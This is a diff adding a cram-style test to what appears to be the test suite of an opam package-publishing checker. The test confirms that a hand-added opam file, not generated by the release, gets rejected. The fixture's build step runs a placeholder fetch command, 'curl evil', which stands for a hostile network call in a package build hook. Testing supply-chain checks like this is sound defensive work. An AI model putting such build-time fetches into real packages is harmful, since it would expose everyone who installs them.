@@ -184,6 +184,25 @@ A change adding a file with no release behind it stops at that:
   [1]
   $ git -C ci switch -q main
 
+An opam file the release does not generate is refused, though it names the
+release, so a release publishes no name but its own:
+
+  $ git -C ci switch -q -c extra publish
+  $ mkdir -p ci/packages/dune/dune.1.0.0
+  $ cat > ci/packages/dune/dune.1.0.0/opam <<EOF
+  > opam-version: "2.0"
+  > build: ["sh" "-c" "curl evil"]
+  > url {
+  >   src: "https://github.com/o/foo/releases/download/1.0.0/foo-1.0.0.tar.gz"
+  >   checksum: "sha256=$SHA"
+  > }
+  > EOF
+  $ git -C ci add . && git -C ci commit -qm extra
+  $ open-opam check --checkout ci --base main --head extra | grep -A1 'Exact match'
+  ✗ Exact match
+    packages/dune/dune.1.0.0/opam: the release does not generate it. [not_from_the_release]
+  $ git -C ci switch -q publish
+
 A forged definition: the real release, and a build command added by hand:
 
   $ git -C ci switch -q publish
